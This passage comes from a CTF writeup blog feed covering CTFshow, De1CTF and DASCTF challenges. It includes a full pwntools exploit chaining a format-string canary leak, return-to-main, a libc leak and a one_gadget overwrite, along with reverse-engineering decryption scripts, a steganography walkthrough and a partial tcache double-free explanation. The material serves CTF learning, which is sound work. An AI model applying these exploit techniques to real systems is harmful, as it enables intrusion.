 0x555555554ac4                            pop    rbx</span><br><span class="line">   0x555555554ac5                            pop    rbp</span><br><span class="line"> ► 0x555555554ac6                            ret             &lt;0x7ffff7a2d830; __libc_start_main+240&gt;</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> pdisass 0x7ffff7a2d830-0x20</span></span><br><span class="line"> ► 0x7ffff7a2d810 &lt;__libc_start_main+208&gt;    add    al, 0x25</span><br><span class="line">   0x7ffff7a2d812 &lt;__libc_start_main+210&gt;    add    byte ptr [rbx], al</span><br><span class="line">   0x7ffff7a2d814 &lt;__libc_start_main+212&gt;    add    byte ptr [rax], al</span><br><span class="line">   0x7ffff7a2d816 &lt;__libc_start_main+214&gt;    mov    rax, qword ptr [rip + 0x3a369b]</span><br><span class="line">   0x7ffff7a2d81d &lt;__libc_start_main+221&gt;    mov    rsi, qword ptr [rsp + 8]</span><br><span class="line">   0x7ffff7a2d822 &lt;__libc_start_main+226&gt;    mov    edi, dword ptr [rsp + 0x14]</span><br><span class="line">   0x7ffff7a2d826 &lt;__libc_start_main+230&gt;    mov    rdx, qword ptr [rax]</span><br><span class="line">   0x7ffff7a2d829 &lt;__libc_start_main+233&gt;    mov    rax, qword ptr [rsp + 0x18]</span><br><span class="line">   0x7ffff7a2d82e &lt;__libc_start_main+238&gt;    call   rax</span><br></pre></td></tr></table></figure><p>从 0x7ffff7a2d82e 往上找到传参开始地址，将返回地址最后两位覆写为目标地址，即<code>0x7ffff7a2d830</code>–&gt;<code>0x7ffff7a2d816</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ret2main</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">56</span>+p64(canary)</span><br><span class="line">payload = payload.ljust(<span class="number">88</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += <span class="string">&#x27;\x16&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;烫&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;火炉远一点！\n&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><p>再次进入 main 之后泄露 libc 地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;你怎么了？\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;%23$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">__libc_start_main_240 = <span class="built_in">eval</span>(p.recv(<span class="number">14</span>))</span><br><span class="line">log.success(<span class="string">&quot;__libc_start_main_240:&quot;</span>+<span class="built_in">hex</span>(__libc_start_main_240))</span><br></pre></td></tr></table></figure><p>最后重写返回地址为 onegadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">56</span>+p64(canary)</span><br><span class="line">payload = payload.ljust(<span class="number">88</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(one_gadget)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;烫&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;火炉远一点！\n&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><h5 id="完整-exp"><a href="#完整-exp" class="headerlink" title="完整 exp"></a>完整 exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;124.156.121.112&quot;,28081)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = <span class="number">0xf1147</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak canary</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;你怎么了？\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%9$p&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">eval</span>(p.recv(<span class="number">18</span>))</span><br><span class="line">log.success(<span class="string">&quot;canart:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment">#ret2main</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">56</span>+p64(canary)</span><br><span class="line">payload = payload.ljust(<span class="number">88</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += <span class="string">&#x27;\x16&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;烫&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;火炉远一点！\n&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;你怎么了？\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;%23$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">__libc_start_main_240 = <span class="built_in">eval</span>(p.recv(<span class="number">14</span>))</span><br><span class="line">log.success(<span class="string">&quot;__libc_start_main_240:&quot;</span>+<span class="built_in">hex</span>(__libc_start_main_240))</span><br><span class="line"></span><br><span class="line">libc_base = __libc_start_main_240 - <span class="number">240</span> - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">one_gadget += libc_base</span><br><span class="line">log.success(<span class="string">&quot;one_gadget:&quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">56</span>+p64(canary)</span><br><span class="line">payload = payload.ljust(<span class="number">88</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(one_gadget)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;烫&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;火炉远一点！\n&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="逆向-签到"><a href="#逆向-签到" class="headerlink" title="逆向_签到"></a>逆向_签到</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p>进来首先是逐个字符（v8）与 v7、v9 运算加密，然后结构与 v6 进行或运算。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    v8 = sub_400818((__int64)aFlag, <span class="number">0LL</span>);       <span class="comment">// 输入值需要与v7 ^ (v7 + (v7 ^ *(&amp;v9 + (signed int)v7)))相等</span></span><br><span class="line">    v6 |= v8 ^ v7 ^ (v7 + (v7 ^ *(&amp;v9 + (<span class="keyword">signed</span> <span class="keyword">int</span>)v7)));</span><br><span class="line">    v4 = v7++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v8 &amp;&amp; v8 != <span class="number">10</span> &amp;&amp; v8 != <span class="number">-1</span> );</span><br></pre></td></tr></table></figure><p>然后就是判断 v6 值，值为 0 就是正确。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v6 )                                     <span class="comment">// 需要v6等于零，就是异或为0，就是v8后面是0</span></span><br><span class="line">    sub_400828((__int64)aFailed, <span class="number">0LL</span>, v3, v4);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    sub_400828((__int64)aCorrect, <span class="number">0LL</span>, v3, v4);</span><br></pre></td></tr></table></figure><p>反推出 v6 应该每一轮加密都是 0 ，进而推出 v8 = v7 ^ (v7 + (v7 ^ *(&amp;v9 + (signed int)v7))) 。</p><p><strong>完整 exp</strong> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">0x66</span>,<span class="number">0x6d</span>,<span class="number">0x63</span>,<span class="number">0x62</span>,<span class="number">0x7f</span>,<span class="number">0x3a</span>,<span class="number">85</span>,<span class="number">106</span>,<span class="number">57</span>,<span class="number">82</span>,<span class="number">122</span>,<span class="number">55</span>,<span class="number">81</span>,<span class="number">19</span>,<span class="number">51</span>,<span class="number">35</span>,<span class="number">67</span>,<span class="number">70</span>,<span class="number">41</span>,<span class="number">61</span>,<span class="number">41</span>,<span class="number">32</span>,<span class="number">127</span>,<span class="number">28</span>,<span class="number">38</span>,<span class="number">77</span>,<span class="number">49</span>,<span class="number">20</span>,<span class="number">80</span>,<span class="number">94</span>,-<span class="number">24</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c)):</span><br><span class="line">x = i ^ ((i ^ c[i]) + i)</span><br><span class="line">print(<span class="built_in">chr</span>(x),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>[/collapse]</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTFshow </tag>
            
            <tag> 36D杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 De1CTF Writeup</title>
      <link href="archives/22e3ff4c/"/>
      <url>archives/22e3ff4c/</url>
      
        <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Misc杂烩-Misc-Chowder"><a href="#Misc杂烩-Misc-Chowder" class="headerlink" title="Misc杂烩/Misc Chowder"></a>Misc杂烩/Misc Chowder</h3><p>[collapse title=”click to see more” status=”false”]</p><p>[scode type=”yellow”]ALL hint：</p><ol><li><p>流量包中的网络连接对解题没有帮助 The network connection in pcap is not helping to the challenge</p></li><li><p>不需要访问流量里任何一个的服务器地址，所有数据都可以从流量包里直接提取 Do not need to connect the network, every data can be extracted from the pcap</p></li><li><p>In the burst test point of compressed packet password, the length of the password is 6, and the first two characters are “D” and “E”. 压缩包密码暴破考点中，密码的长度为6位，前两位为DE。</p></li></ol><p>[/scode]</p><p><strong>Examination point：Traffic Analysis,RAR Password burst and other steganography methods.</strong></p><p>First trace HTTP and find that the person who uploaded the question uploaded jpg to /test/upload_file.php. A total of 7 jpg files were uploaded.</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-05-04-r15ekLynWBDFCOeL.png"></p><p>Extract all jpg pictures from the traffic package. The last jpg is a link to a google drive.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;drive.google.com&#x2F;file&#x2F;d&#x2F;1JBdPj7eRaXuLCTFGn7AluAxmxQ4k1jvX&#x2F;view</span><br></pre></td></tr></table></figure><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-05-04-NALbQioLYoCIJ8ef.png"></p><p>Inside is a zip file containing a docx document.</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-05-04-u5bTYjLsBLj19XTz.png"></p><p>There is no flag in the document. But docx is actually a compressed file, try to modify it to a zip file and then open it.</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-05-04-qV7LnwnjIxqdobox.png"></p><p>We found a compressed package, but it was encrypted. Before the hint was released, I thought the ssh key in the traffic packet (pcap) was the decompression password. You can find the record of ssh key modification in the front of pcap.</p><p>[scode type=”yellow”]hint3:In the burst test point of compressed packet password, the length of the password is 6, and the first two characters are “D” and “E”. 压缩包密码暴破考点中，密码的长度为6位，前两位为DE。</p><p>[/scode]</p><p>Blast to get the password:<code>DE34Q1</code>.Unzip to get a jpg picture, there is almost no clue. <img src="https://mrskye.cn-gd.ufileos.com/img/2020-05-04-dX57XNVXF750ATdI.jpg"></p><p>Put into winhex analysis, you can find a rar compressed package hidden in jpg. I have tried to use binwalk and foremost separation. Therefore, I manually separated the compressed package.</p><p>If you use common compression software such as bandizip and winrar, you can only get 3 files. None of these three files is the final flag.</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-05-04-A6ktJFH2MMJEUoc0.png"></p><p>If you are using <a href="https://yasuo.360.cn/">360压缩</a>, you will get 4 files, one of which contains the flag.This was discovered by my teammates.</p><p>If you don’t know <a href="https://yasuo.360.cn/">360压缩</a>, continue to put rar into winhex analysis. The fourth file ffffllll.txt can be found at the end of the file.（You may find that 666.jpg is actually a png picture. But it seems useless.）</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-05-04-XHyutfqhg5jsI5Fg.png"></p><p>A string was found in front of this ffffllll.txt: STM. It is the identifier of NTFS alternate data stream in the rar file.</p><p>For how to read STM content(flag), please click here.<a href="https://ilovectf.github.io/ads/2020/05/03/De1.html">ilovectf</a></p><p>[/collapse]</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> De1CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF 安恒四月春季战 Writeup</title>
      <link href="archives/cfd73b01/"/>
      <url>archives/cfd73b01/</url>
      
        <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="6G-签到题"><a href="#6G-签到题" class="headerlink" title="6G 签到题"></a>6G 签到题</h3><p><strong>不需要下载整个文件</strong>。点击下载后，就可以停了。然后 winhex 打开下载缓存文件，查看十六进制内容，发现惊喜。</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-04-25-texpKUnZ0uJAws9h.png"></p><h3 id="blueshack"><a href="#blueshack" class="headerlink" title="blueshack"></a>blueshack</h3><p>流量分析题目，流量包是蓝牙流量。</p><p>找到一个压缩包，复制粘贴提取出来。（7z 文件头是：37 7a bc af）</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-04-25-b7T426PixNAD3grz.png"></p><p>压缩包加密，提示是蓝牙连接的 PIN 码，就返回开头选择 PIN 校验数据流</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-04-25-8RVDfETJIeqEgNd8.png"></p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><p>加密函数与校验函数如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(&amp;v5); ++i )</span><br><span class="line">    v6[i - <span class="number">112</span>] = (v6[i - <span class="number">112</span>] ^ <span class="number">6</span>) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;v5, <span class="string">&quot;akhb~chdaZrdaZudqduvdZvvv|&quot;</span>) )</span><br><span class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;yes!you are right&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;try again&quot;</span>);</span><br></pre></td></tr></table></figure><p>输入字符串逐字符异或 6 + 1 加密后，与密文对比。</p><p>解密脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">m = <span class="string">&quot;akhb~chdaZrdaZudqduvdZvvv|&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    flag = <span class="built_in">chr</span>((<span class="built_in">ord</span>(i)-<span class="number">1</span>)^<span class="number">6</span>)</span><br><span class="line">    print(flag,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h3><p>主要功能函数如下：自定义输入 10  个以上的加密参数，利用参数生成一个密钥，密钥与明文异或输出。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v11 &lt;= <span class="number">9</span> )                               <span class="comment">// 加密参数个数大于9个</span></span><br><span class="line">    return &#x27;\xFF\xFF\xFF\xFF&#x27;;</span><br><span class="line">  v15 = <span class="keyword">operator</span> <span class="keyword">new</span>[](v11);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v11; ++i )                   <span class="comment">// 获取v11个加密参数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, i + v15);<span class="comment">// 加密参数在v15</span></span><br><span class="line">  v6 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;You have input sth.&quot;</span>, v5);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  v8 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;I will mix them with the enc_flag!&quot;</span>, v7);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v8, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">37</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; v11; ++k )                 <span class="comment">// 加密v11轮</span></span><br><span class="line">      v10 ^= *(_BYTE *)(k + v15);</span><br><span class="line">    <span class="built_in">putchar</span>(v10 ^ (<span class="keyword">unsigned</span> __int8)*(&amp;v16 + j));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;\nMaybe you have found the `flag`\n&quot;</span>, v9);</span><br></pre></td></tr></table></figure><p>这里我是<del>试</del>观察到，10 个 参数全为 1 或 2 ，输出值不变。然后根据前面 flag 形式推测 flag 结构为 flag{} 。然后密文输出第一个是 &amp; ，应该对应 f ，也就是异或 64 就解出来 flag 。</p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v16 = [<span class="number">0x26</span>,<span class="number">0x2C</span>,<span class="number">0x21</span>,<span class="number">0x27</span>,<span class="number">0x3B</span>,<span class="number">0x23</span>,<span class="number">0x22</span>,<span class="number">0x73</span>,<span class="number">0x75</span>,<span class="number">0x72</span>,<span class="number">113</span>,<span class="number">33</span>,<span class="number">36</span>,<span class="number">117</span>,<span class="number">118</span>,<span class="number">119</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">38</span>,<span class="number">114</span>,<span class="number">117</span>,<span class="number">113</span>,<span class="number">38</span>,<span class="number">34</span>,<span class="number">113</span>,<span class="number">114</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">36</span>,<span class="number">112</span>,<span class="number">115</span>,<span class="number">118</span>,<span class="number">121</span>,<span class="number">112</span>,<span class="number">35</span>,<span class="number">37</span>,<span class="number">121</span>,<span class="number">61</span>]</span><br><span class="line">enc = [<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;=&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v16:</span><br><span class="line">print(<span class="built_in">chr</span>(i^<span class="number">64</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="sales-office"><a href="#sales-office" class="headerlink" title="sales_office"></a>sales_office</h3><p><strong>考点：UAF–》DoubleFree，tcache</strong></p><p>一开始看以为利用点是在 buy 函数。创建堆失败后，结构体的堆未被删除。最后是 sell 函数没有将 free 的堆指针置零。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">  v1 = read_int(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">12</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( area[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*area[v1]);                            <span class="comment">// 存储堆</span></span><br><span class="line">    <span class="built_in">free</span>(area[v1]);                             <span class="comment">// 索引堆</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><p>题目有输出函数，就把索引堆的 fd 指针覆写为函数 got 地址。覆写的方法比较巧妙。</p><p>首先 Double Free 布置 tcache ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)<span class="comment">#维持tcache数量</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>完成效果：chunk1 index -&gt; chunk1 data –&gt; chunk1 index -&gt; chunk1 data</p><p>布置 chunk1 data fd 指向 chunk2 data fd ，然后 malloc chunk1 index ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">buy(<span class="number">0x10</span>,p64(heap_base+<span class="number">0x2e0</span>))</span><br><span class="line">buy(<span class="number">0x40</span>,p64(<span class="number">0xdeadbeef</span>))</span><br></pre></td></tr></table></figure><p>修改 chunk2 index fd 指向 <a href="mailto:&#109;&#97;&#x6c;&#x6c;&#x6f;&#x63;&#64;&#x67;&#x6f;&#x74;&#46;&#x70;&#108;&#x74;">&#109;&#97;&#x6c;&#x6c;&#x6f;&#x63;&#64;&#x67;&#x6f;&#x74;&#46;&#x70;&#108;&#x74;</a> 